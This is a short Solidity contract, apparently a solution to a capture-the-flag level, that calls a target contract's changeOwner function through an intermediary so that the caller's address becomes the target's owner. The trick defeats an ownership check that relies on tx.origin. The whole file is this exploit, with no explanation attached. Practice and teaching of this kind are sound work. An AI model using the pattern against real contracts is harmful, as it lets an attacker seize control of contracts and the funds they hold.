// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneCaller {
    address public owner;
    ITelephone public target;

    constructor(address _target) {
        owner = msg.sender;
        target = ITelephone(_target);
    }

    function callTelephone() public{
        target.changeOwner(owner);
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}